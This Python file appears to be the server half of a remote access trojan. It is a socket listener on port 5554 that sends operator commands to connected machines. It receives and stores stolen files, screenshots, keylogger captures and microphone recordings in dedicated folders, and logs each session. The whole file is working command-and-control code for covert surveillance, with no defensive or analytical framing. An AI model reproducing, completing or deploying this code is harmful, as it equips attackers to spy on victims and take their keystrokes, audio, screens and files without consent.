import socket
import threading
import time
from PIL import Image
import io
import wave

class App:
    def __init__(self):
        self.port = 5554
        self.socket = None
        self.clients = {}
        self.time = time.time()

    def run(self):
        try:
            self.socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None)
            self.socket.bind(("0.0.0.0", self.port))
            self.socket.listen(10) #max clients
            print("server now online")
            print("send a command to the connected client : ")
            with open("ressources/logs/log_" + str(self.time), "w") as f:
                f.write("server connected at local time : " + str(self.time) + "\n")
        except Exception as e:
            print("error while creating server : ", e)
            
        while True:
            try:
                client, client_addr = self.socket.accept()
                
                if not client_addr in self.clients:
                    self.clients[client_addr] = threading.Thread(target=self.client, args=(client, client_addr, ))
                    self.clients[client_addr].start()
                
            except Exception as e:
                print("error : ", e)
        

        
    def client(self, client, client_addr):
        with open("ressources/logs/log_" + str(self.time), "a") as f:
            f.write("connected to : " + str(client_addr) + "\n")
        running = True
        while running:
            new_logs = ""
            try:
                msg_out = ""
                msg_out = input("[" + client_addr[0] + "/" + str(client_addr[1]) + "] >")
                new_logs += "[" + client_addr[0] + "/" + str(client_addr[1]) + "] > "+ msg_out + "\n"
                    
                client.send(msg_out.encode())
                
                recv_header = client.recv(4096).decode()
                
                print("reveiced : ")
                new_logs += "reveived : \n"
                if recv_header.startswith("FILE"):
                    try:
                        header = recv_header.split(":")
                        print(f"receiving file : {header[1]}")
                        print(f"file size : {int(header[2])} bytes")
                        
                        recv_file = b""
                        while len(recv_file) < int(header[2]):
                            chunk = client.recv(4096)
                            if not chunk:
                                break
                            recv_file += chunk
                            print(f"received {len(recv_file)}/{int(header[2])} bytes")
                            
                        name = f"ressources/files/file_{header[1]}"
                        with open(name, "wb") as f:
                            f.write(recv_file)                          
                            
                            
                        print(f"filed saved as : {name}")
                        new_logs += f"filed saved as : {name} \n"
                    except Exception as e:
                        print("error while downloading file : ", e)
                        new_logs += "error while downloading file : " + str(e) + "\n"
                        
                elif recv_header.startswith("IMG"):
                    try:
                        header = recv_header.split(":")
                        img_size = int(header[1])
                        img_data = b""
                        
                        while len(img_data) < img_size:
                            packet = client.recv(4096)
                            if not packet:
                                break
                            img_data += packet
                        
                        name = "ressources/screenshots/screenshot_" + str(time.time()) + ".png"
                        
                        if header[2] == "BYTES":
                            with open(name, "wb") as f:
                                f.write(img_data)
                        elif header[2] == "PIL":
                            img = Image.open(io.BytesIO(img_data))
                            img.save(name)
                        
                        print("screenshot received and saved as ", name)
                        print("the screenshot size is ", header[1], " bytes")
                        new_logs += "screenshot received and saved as " + name + "\n"
                        new_logs += "the screenshot size is " + str(header[1]) + " bytes"
                    except Exception as e:
                        print("error while downloading screenshot : ", e)
                        new_logs += "error while downloading screenshot : " + str(e) + "\n"
                        
                elif recv_header.startswith("TEXTFILE"):
                    try:
                        header = recv_header.split(":")
                        print("receiving text file containing keylogger informations ...")

                        data = client.recv(4096).decode("utf-8")
                            
                        name = f"ressources/keylogger/keylogger_" + str(time.time()) + ".txt"
                        with open(name, "w") as f:
                            f.write(data)
                            
                        print(f"keylogger informations saved as : ", name)
                        new_logs += f"keylogger informations saved as : {name} \n"
                    except Exception as e:
                        print("error while downloading keylogger informations : ", e)
                        new_logs += "error while downloading keylogger informations : " + str(e) + "\n"

                elif recv_header.startswith("AUDIO"):
                    try:
                        header = recv_header.split(":")
                        print(f"receiving file with size : {header[1]}")
                        
                        audio_data = b""
                        while len(audio_data) < int(header[1]):
                            chunk = client.recv(4096)
                            if not chunk:
                                break
                            audio_data += chunk
                            print(f"received {len(audio_data)}/{int(header[1])} bytes")
                            
                        name = f"ressources/audio/microphone_{header[1]}" + ".wav"

                        wf = wave.open(name, 'wb')
                        wf.setnchannels(1)
                        wf.setsampwidth(2)
                        wf.setframerate(44100)
                        wf.writeframes(audio_data)
                        wf.close()
                        print(f"microphone informations saved as : ", name)
                        new_logs += f"microphone informations saved as : {name} \n"
                    except Exception as e:
                        print("error while downloading microphone informations : ", e)
                        new_logs += "error while downloading microphone informations : " + str(e) + "\n"

                else:
                    msg = client.recv(4096).decode()
                    print(msg)
                    new_logs += "received message : " + msg + "\n"
                    
                with open("ressources/logs/log_" + str(self.time), "a") as f:
                    f.write(new_logs)
            
            except:
                running = False
                break
            
        client.close()
                

if __name__ == "__main__":
    app = App()
    app.run()
